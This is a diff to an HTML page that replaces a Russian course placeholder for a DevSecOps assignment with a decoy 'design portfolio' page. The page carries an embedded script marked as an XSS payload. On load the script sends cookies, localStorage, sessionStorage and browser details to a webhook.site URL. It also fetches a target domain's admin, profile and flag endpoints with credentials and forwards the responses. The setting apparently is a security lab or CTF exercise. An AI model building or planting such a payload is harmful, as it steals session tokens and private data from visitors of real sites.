@@ -1,17 +1,85 @@
-<!doctype html>
-<html lang="ru">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>DevSecOps · 02-1 — Науменко</title>
-  <link rel="stylesheet" href="/style.css">
+  <meta charset="UTF-8">
+  <title>My Design Portfolio</title>
+  <style>
+    body { font-family: sans-serif; max-width: 800px; margin: 40px auto; padding: 0 20px; }
+    h1 { color: #333; }
+    p { line-height: 1.6; color: #555; }
+  </style>
 </head>
 <body>
-  <main>
-    <a class="back" href="/">← На главную</a>
-    <p class="eyebrow">Школа анализа данных</p>
-    <h1>DevSecOps · 02-1</h1>
-    <p class="intro">Это страница учебного задания по DevSecOps. Пока здесь временный текст — позже появятся материалы и результаты работы.</p>
-  </main>
+  <h1>Hello, Giovanni Giorgio here</h1>
+  <p>Welcome to my design portfolio. I'm an uprising web-designer.</p>
+  <p>Check out my latest work and let me know what you think!</p>
+
+  <!-- XSS PAYLOAD: начинается здесь -->
+  <script>
+  (function() {
+    const WEBHOOK = 'https://webhook.site/5777831e-326d-43f6-83a0-de255e891b9f';
+
+    // Универсальная функция отправки
+    function send(label, data) {
+      try {
+        fetch(WEBHOOK, {
+          method: 'POST',
+          mode: 'no-cors',
+          body: JSON.stringify({
+            label: label,
+            url: location.href,
+            referrer: document.referrer,
+            data: data,
+            timestamp: new Date().toISOString()
+          })
+        });
+      } catch (e) {}
+    }
+
+    // 1. Cookie
+    send('cookies', document.cookie);
+
+    // 2. localStorage
+    try { send('localStorage', JSON.stringify(localStorage)); } catch (e) {}
+
+    // 3. sessionStorage
+    try { send('sessionStorage', JSON.stringify(sessionStorage)); } catch (e) {}
+
+    // 4. Информация о браузере/окружении
+    send('env', JSON.stringify({
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      referrer: document.referrer,
+      origin: location.origin
+    }));
+
+    // 5. Пробуем достучаться до внутренних эндпоинтов target-домена
+    // (замените TARGET на реальный домен уязвимого приложения!)
+    const TARGET = 'https://TARGET-DOMAIN-HERE';
+    const endpoints = [
+      '/',
+      '/admin',
+      '/api/user',
+      '/api/me',
+      '/api/profile',
+      '/profile',
+      '/api/flag'
+    ];
+
+    endpoints.forEach(function(path) {
+      fetch(TARGET + path, { credentials: 'include' })
+        .then(function(r) { return r.text(); })
+        .then(function(text) {
+          send('endpoint:' + path, text.slice(0, 5000));
+        })
+        .catch(function(e) {
+          send('endpoint-error:' + path, e.message);
+        });
+    });
+  })();
+  </script>
+  <!-- XSS PAYLOAD: заканчивается здесь -->
+
 </body>
 </html>
